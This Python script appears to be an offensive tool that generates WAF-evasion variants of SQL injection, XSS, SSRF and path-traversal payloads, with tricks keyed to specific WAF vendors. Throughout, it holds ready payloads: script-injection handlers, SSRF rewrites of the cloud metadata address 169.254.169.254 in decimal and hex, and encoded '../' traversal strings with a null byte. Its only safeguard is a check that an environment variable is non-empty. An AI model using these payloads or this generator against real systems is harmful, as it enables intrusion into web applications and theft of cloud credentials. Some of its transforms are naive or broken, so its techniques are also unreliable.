#!/usr/bin/env python3
"""
waf_payload_gen.py - Generate WAF bypass payloads for SQLi, XSS, and other injection types.
Produces encoded/obfuscated variants of attack payloads to evade WAF signatures.

Usage:
    python scripts/waf_payload_gen.py --type sqli --payload "' OR 1=1--" --waf cloudflare
    python scripts/waf_payload_gen.py --type xss --payload "<script>alert(1)</script>" --waf modsecurity
    python scripts/waf_payload_gen.py --type sqli --payload "' UNION SELECT 1,2,3--" --all-encodings
    python scripts/waf_payload_gen.py --type ssrf --payload "http://169.254.169.254/latest/meta-data/" --waf aws

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import base64
import os
import sys
import urllib.parse

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)


# ---- Encoding functions ----
def url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def double_url_encode(s: str) -> str:
    return url_encode(url_encode(s))


def html_entity_encode(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def hex_encode(s: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in s)


def unicode_encode(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)


def base64_encode_payload(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def case_variation(s: str) -> str:
    result = []
    for i, c in enumerate(s):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return "".join(result)


# ---- WAF-specific techniques ----
WAF_TECHNIQUES = {
    "cloudflare": {
        "sqli": [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("OR", "||"),
            lambda p: p.replace("AND", "&&"),
            lambda p: case_variation(p),
            lambda p: p.replace("SELECT", "SeLeCt"),
            lambda p: url_encode(p),
        ],
        "xss": [
            lambda p: p.replace("<script>", "<ScRiPt>"),
            lambda p: p.replace("alert", "prompt"),
            lambda p: p.replace("alert(1)", "confirm`1`"),
            lambda p: "<img src=x onerror=alert(1)>",
            lambda p: "<svg onload=alert(1)>",
        ],
    },
    "modsecurity": {
        "sqli": [
            lambda p: p.replace(" ", "%20"),
            lambda p: p.replace("--", "#"),
            lambda p: p.replace("'", "0x27"),
            lambda p: p + " -- -",
            lambda p: p.replace("UNION", "UniOn").replace("SELECT", "SeLeCt"),
        ],
        "xss": [
            lambda p: "<script/src=data:,alert(1)>",
            lambda p: "javascript:alert(1)",
            lambda p: "<details open ontoggle=alert(1)>",
            lambda p: f"<img src=1 onerror={base64_encode_payload('alert(1)')}>",
        ],
    },
    "aws": {
        "sqli": [
            lambda p: double_url_encode(p),
            lambda p: p.replace(" ", "+"),
            lambda p: p,
        ],
        "ssrf": [
            lambda p: p.replace("http://169.254.169.254", "http://169.254.169.254/"),
            lambda p: p.replace("169.254.169.254", "2852039166"),  # decimal IP
            lambda p: p.replace("169.254.169.254", "0xa9.0xfe.0xa9.0xfe"),  # hex IP
            lambda p: "http://[::ffff:169.254.169.254]/latest/meta-data/",
            lambda p: "http://metadata.nicob.net/",  # open redirect
        ],
    },
    "generic": {
        "sqli": [
            lambda p: p,
            lambda p: p.replace(" ", "/**/"),
            lambda p: url_encode(p),
            lambda p: double_url_encode(p),
            lambda p: case_variation(p),
        ],
        "xss": [
            lambda p: p,
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            lambda p: html_entity_encode(p),
            lambda p: "<svg/onload=alert(1)>",
            lambda p: "';alert(1)//",
        ],
        "lfi": [
            lambda p: p,
            lambda p: p.replace("../", "..%2F"),
            lambda p: p.replace("../", "%2e%2e%2f"),
            lambda p: p.replace("../", "%2e%2e/"),
            lambda p: p + "%00",  # null byte
        ],
    }
}


def generate_bypasses(payload_type: str, payload: str, waf: str = "generic") -> list:
    require_proof()
    techniques = WAF_TECHNIQUES.get(waf, WAF_TECHNIQUES["generic"]).get(payload_type, [])
    if not techniques:
        # Fall back to generic
        techniques = WAF_TECHNIQUES["generic"].get(payload_type, [lambda p: p])

    results = []
    for i, fn in enumerate(techniques):
        try:
            result = fn(payload)
            results.append({"variant": i+1, "payload": result, "technique": fn.__name__ if hasattr(fn, '__name__') else f"technique_{i+1}"})
        except Exception as e:
            results.append({"variant": i+1, "payload": payload, "error": str(e)})
    return results


def main():
    p = argparse.ArgumentParser(description="WAF bypass payload generator (authorized use only)")
    p.add_argument("--type", choices=["sqli","xss","ssrf","lfi","rce"], required=True)
    p.add_argument("--payload", required=True)
    p.add_argument("--waf", choices=["cloudflare","modsecurity","aws","akamai","f5","generic"], default="generic")
    p.add_argument("--all-encodings", action="store_true")
    p.add_argument("--output", help="Output to file")
    args = p.parse_args()

    print(f"[*] WAF: {args.waf} | Type: {args.type}")
    print(f"[*] Original: {args.payload}")
    print()

    bypasses = generate_bypasses(args.type, args.payload, args.waf)
    for b in bypasses:
        if b.get("error"):
            print(f"  [V{b['variant']}] ERROR: {b['error']}")
        else:
            print(f"  [V{b['variant']}] {b['payload']}")

    if args.output:
        import json
        with open(args.output, "w") as f:
            json.dump(bypasses, f, indent=2)
        print(f"\n[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
